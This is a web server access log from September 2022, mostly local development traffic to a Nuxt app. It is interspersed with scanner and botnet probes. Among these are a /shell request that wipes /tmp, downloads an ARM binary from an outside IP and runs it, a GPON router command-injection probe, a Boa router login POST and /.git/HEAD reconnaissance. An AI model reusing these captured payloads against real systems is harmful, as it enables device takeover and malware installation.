172.21.0.1 - - [21/Sep/2022:20:01:31 +0000] "\x16\x03\x01\x01 \x01\x00\x01\x1C\x03\x03\xFF\xB6\xFB\xA2\x9E\x10hP{\xCD\xBA|$`\xCF\xC7\x17B\x08\xD0-\x1F\xAC\xC5\x16xw\x02|o\xC3\x14 F\xB0\x08F\xAE\xA9\x8A\xA2\xAA" 400 150 "-" "-"
192.168.128.1 - - [22/Sep/2022:06:11:40 +0000] "GET /config/mail.js HTTP/1.1" 502 552 "-" "Mozilla/5.0 (Linux; Android 7.1.1; Coolpad 3632A Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36"
192.168.128.1 - - [22/Sep/2022:06:11:40 +0000] "GET /config/config.js HTTP/1.1" 502 552 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36"
192.168.128.1 - - [22/Sep/2022:06:11:40 +0000] "GET /s3.js HTTP/1.1" 502 150 "-" "Opera/9.80 (Macintosh; Intel Mac OS X; U; en) Presto/2.6.30 Version/10.61"
192.168.128.1 - - [22/Sep/2022:06:18:13 +0000] "GET / HTTP/1.1" 502 150 "-" "Mozilla/5.0 zgrab/0.x"
192.168.176.1 - - [22/Sep/2022:07:40:27 +0000] "GET / HTTP/1.1" 502 552 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
192.168.176.1 - - [22/Sep/2022:07:40:30 +0000] "GET /favicon.ico HTTP/1.1" 502 552 "http://localhost/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
192.168.176.1 - - [22/Sep/2022:07:42:37 +0000] "GET / HTTP/1.1" 502 552 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
192.168.176.1 - - [22/Sep/2022:07:42:40 +0000] "GET /favicon.ico HTTP/1.1" 502 552 "http://localhost/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
192.168.176.1 - - [22/Sep/2022:07:59:35 +0000] "GET / HTTP/1.1" 502 552 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
192.168.176.1 - - [22/Sep/2022:07:59:35 +0000] "GET /favicon.ico HTTP/1.1" 502 552 "http://localhost/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
192.168.176.1 - - [22/Sep/2022:08:01:22 +0000] "U\x08\xCD)!\xC1\xE2H3$\xB8guNf,\xB8+w\xC5\x98\x0F5\xC5\x22\x83\xF4n\x94\x0F5\xC5\x99\x0Bw\xC5\x98\x0F6\xCD\x98\x0F5\xC5\x98\x0F5\xC52\x0F5\xC5\x98\x0F\x1E\xEE\x98\x0F5\xC5\xB0\x0F5\xC5\x98\x0F5\xC5\x98\x0F5\xC5\x98\x0F5\xC5\x99\x0E5\xC5\x98\x0F#\xC5\x98\x0F5\xC5\x98\x0F5\xC5\x98\x0F5\xC5\x98\x0F5\xC5\x98\x0F1\xC5\x98\x0F5\xC5\x98\x0F5\xC5\x04\x00" 400 150 "-" "-"
192.168.176.1 - - [22/Sep/2022:08:01:23 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x8Eb\xF5\x17\xD5$\x17\xACDN\x1F#\xE6\x5C\xFF\x1AT*^\xD3\x9D\x1F\xD5\x18\xF8Z\x1F\x84\xF1\x8FM\x06\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 150 "-" "-"
192.168.176.1 - - [22/Sep/2022:08:01:23 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x036\xFE\x9B\x9B\xBE\xC7\x05\xE9\xCC/\x8C\x86\xC4\x88KD\xE0\xFE:\x0E\xD6\xA6\xB9\xB91EGW\xC5\xB2\x07\x14\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 150 "-" "-"
192.168.176.1 - - [22/Sep/2022:08:01:23 +0000] "GET / HTTP/1.1" 502 150 "-" "Mozilla/5.0 zgrab/0.x"
192.168.176.1 - - [22/Sep/2022:08:31:43 +0000] "GET / HTTP/1.1" 502 552 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
192.168.176.1 - - [22/Sep/2022:08:31:44 +0000] "GET /favicon.ico HTTP/1.1" 502 552 "http://localhost/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
192.168.176.1 - - [22/Sep/2022:08:32:01 +0000] "GET / HTTP/1.1" 502 150 "-" "libwww-perl/6.67"
192.168.176.1 - - [22/Sep/2022:08:47:23 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+ 91.218.67.179/reaper/reap.arm4;chmod+777+/tmp/reap.arm4;sh+/tmp/reap.arm4 HTTP/1.1" 400 150 "-" "-"
192.168.176.1 - - [22/Sep/2022:09:15:30 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xD49F\xA5)M\xEB\xA5\xC1\xDB?b\x8A\xDE\xAB\x839\xE7\xABK\xDD\x89\x0Cd\xF1_xa\xC0\x04\x1AO\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 150 "-" "-"
192.168.176.1 - - [22/Sep/2022:09:15:33 +0000] "GET / HTTP/1.1" 502 150 "-" "Mozilla/5.0 zgrab/0.x"
192.168.176.1 - - [22/Sep/2022:09:28:17 +0000] "GET / HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
192.168.176.1 - - [22/Sep/2022:09:41:51 +0000] "GET / HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
192.168.176.1 - - [22/Sep/2022:09:45:18 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 502 150 "http://77.40.48.136:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
192.168.176.1 - - [22/Sep/2022:09:45:18 +0000] "" 400 0 "-" "-"
192.168.176.1 - - [22/Sep/2022:09:54:25 +0000] "POST /GponForm/diag_Form?images/ HTTP/1.1" 502 150 "-" "Hello, World"
192.168.176.1 - - [22/Sep/2022:09:54:25 +0000] ";sh+/tmp/gpon80&ipv=0" 400 150 "-" "-"
192.168.176.1 - - [22/Sep/2022:10:49:46 +0000] "GET /.git/HEAD HTTP/1.1" 499 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:98.0) Gecko/20100101 Firefox/98.0"
192.168.176.1 - - [22/Sep/2022:11:26:27 +0000] "GET / HTTP/1.1" 502 552 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
192.168.176.1 - - [22/Sep/2022:11:30:56 +0000] "GET / HTTP/1.1" 502 552 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
192.168.176.1 - - [22/Sep/2022:13:03:21 +0000] "GET / HTTP/1.1" 502 150 "-" "libwww-perl/6.67"
192.168.176.1 - - [22/Sep/2022:13:18:51 +0000] "GET / HTTP/1.1" 502 150 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0"
192.168.176.1 - - [22/Sep/2022:13:18:54 +0000] "GET /favicon.ico HTTP/1.1" 502 150 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0"
192.168.176.1 - - [22/Sep/2022:13:26:30 +0000] "CONNECT mkzaim.ru:443 HTTP/1.1" 400 150 "-" "-"
192.168.176.1 - - [22/Sep/2022:13:26:57 +0000] "GET / HTTP/1.1" 502 552 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
192.168.176.1 - - [22/Sep/2022:14:10:15 +0000] "GET / HTTP/1.0" 502 150 "-" "-"
192.168.176.1 - - [22/Sep/2022:14:30:17 +0000] "GET / HTTP/1.1" 502 552 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
192.168.176.1 - - [22/Sep/2022:14:30:17 +0000] "GET /favicon.ico HTTP/1.1" 502 552 "http://localhost/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
192.168.176.1 - - [22/Sep/2022:14:32:29 +0000] "GET / HTTP/1.1" 502 552 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
192.168.176.1 - - [22/Sep/2022:14:32:29 +0000] "GET /favicon.ico HTTP/1.1" 502 552 "http://localhost/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
192.168.224.1 - - [22/Sep/2022:14:33:55 +0000] "GET / HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
192.168.224.1 - - [22/Sep/2022:14:33:55 +0000] "GET /favicon.ico HTTP/1.1" 404 548 "http://localhost/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
192.168.224.1 - - [22/Sep/2022:14:33:57 +0000] "GET / HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
192.168.224.1 - - [22/Sep/2022:14:34:43 +0000] "GET / HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
192.168.224.1 - - [22/Sep/2022:14:34:44 +0000] "GET / HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
192.168.224.1 - - [22/Sep/2022:14:34:45 +0000] "GET / HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
192.168.224.1 - - [22/Sep/2022:14:35:01 +0000] "GET / HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
192.168.224.1 - - [22/Sep/2022:14:35:03 +0000] "GET / HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
192.168.224.1 - - [22/Sep/2022:14:35:05 +0000] "GET / HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
172.18.0.1 - - [22/Sep/2022:14:48:09 +0000] "GET / HTTP/1.1" 404 146 "-" "libwww-perl/6.67"
172.18.0.1 - - [22/Sep/2022:14:49:41 +0000] "GET / HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
172.18.0.1 - - [22/Sep/2022:14:50:52 +0000] "GET / HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
172.18.0.1 - - [22/Sep/2022:14:51:11 +0000] "GET / HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
172.18.0.1 - - [22/Sep/2022:14:51:12 +0000] "GET / HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
172.18.0.1 - - [22/Sep/2022:14:51:22 +0000] "GET / HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
172.18.0.1 - - [22/Sep/2022:14:51:49 +0000] "GET / HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
172.18.0.1 - - [22/Sep/2022:14:51:50 +0000] "GET / HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
172.18.0.1 - - [22/Sep/2022:14:51:50 +0000] "GET / HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
172.18.0.1 - - [22/Sep/2022:14:51:51 +0000] "GET / HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
172.18.0.1 - - [22/Sep/2022:14:51:51 +0000] "GET / HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
172.18.0.1 - - [22/Sep/2022:14:51:52 +0000] "GET / HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
172.18.0.1 - - [22/Sep/2022:14:51:52 +0000] "GET / HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
172.18.0.1 - - [22/Sep/2022:14:51:52 +0000] "GET / HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
172.18.0.1 - - [22/Sep/2022:14:51:52 +0000] "GET / HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
172.18.0.1 - - [22/Sep/2022:14:51:52 +0000] "GET / HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
172.18.0.1 - - [22/Sep/2022:14:51:53 +0000] "GET / HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
172.21.0.1 - - [22/Sep/2022:14:52:34 +0000] "GET / HTTP/1.1" 200 2568 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
172.21.0.1 - - [22/Sep/2022:14:52:34 +0000] "GET /_nuxt/8de3182.js HTTP/1.1" 404 548 "http://localhost/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
172.21.0.1 - - [22/Sep/2022:14:52:34 +0000] "GET /_nuxt/528af99.js HTTP/1.1" 404 548 "http://localhost/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
172.21.0.1 - - [22/Sep/2022:14:52:34 +0000] "GET /_nuxt/dd7e543.js HTTP/1.1" 404 548 "http://localhost/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
172.21.0.1 - - [22/Sep/2022:14:52:34 +0000] "GET /_nuxt/6003cb2.js HTTP/1.1" 404 548 "http://localhost/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
172.21.0.1 - - [22/Sep/2022:14:52:43 +0000] "GET / HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
172.21.0.1 - - [22/Sep/2022:14:52:43 +0000] "GET /_nuxt/8de3182.js HTTP/1.1" 404 548 "http://localhost/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
172.21.0.1 - - [22/Sep/2022:14:52:43 +0000] "GET /_nuxt/dd7e543.js HTTP/1.1" 404 548 "http://localhost/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
172.21.0.1 - - [22/Sep/2022:14:52:43 +0000] "GET /_nuxt/528af99.js HTTP/1.1" 404 548 "http://localhost/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
172.21.0.1 - - [22/Sep/2022:14:52:43 +0000] "GET /_nuxt/6003cb2.js HTTP/1.1" 404 548 "http://localhost/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
172.21.0.1 - - [22/Sep/2022:14:53:01 +0000] "GET / HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
172.21.0.1 - - [22/Sep/2022:14:53:01 +0000] "GET /_nuxt/8de3182.js HTTP/1.1" 404 548 "http://localhost/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
172.21.0.1 - - [22/Sep/2022:14:53:01 +0000] "GET /_nuxt/6003cb2.js HTTP/1.1" 404 548 "http://localhost/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
172.21.0.1 - - [22/Sep/2022:14:53:01 +0000] "GET /_nuxt/dd7e543.js HTTP/1.1" 404 548 "http://localhost/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
172.21.0.1 - - [22/Sep/2022:14:53:01 +0000] "GET /_nuxt/528af99.js HTTP/1.1" 404 548 "http://localhost/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
172.24.0.1 - - [22/Sep/2022:14:54:06 +0000] "GET / HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
172.24.0.1 - - [22/Sep/2022:14:54:06 +0000] "GET /_nuxt/8de3182.js HTTP/1.1" 200 2420 "http://localhost/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
172.24.0.1 - - [22/Sep/2022:14:54:06 +0000] "GET /_nuxt/dd7e543.js HTTP/1.1" 200 420342 "http://localhost/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
172.24.0.1 - - [22/Sep/2022:14:54:06 +0000] "GET /_nuxt/6003cb2.js HTTP/1.1" 200 462486 "http://localhost/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
172.24.0.1 - - [22/Sep/2022:14:54:06 +0000] "GET /_nuxt/528af99.js HTTP/1.1" 200 310256 "http://localhost/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
172.24.0.1 - - [22/Sep/2022:14:54:06 +0000] "GET /_nuxt/71f3d38.js HTTP/1.1" 200 3991 "http://localhost/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
172.24.0.1 - - [22/Sep/2022:14:54:06 +0000] "GET /_nuxt/fonts/poppins-v5-latin-regular.4d16d09.woff2 HTTP/1.1" 200 7904 "http://localhost/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
172.24.0.1 - - [22/Sep/2022:14:54:06 +0000] "GET /_nuxt/img/logo.de4e971.png HTTP/1.1" 200 13852 "http://localhost/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
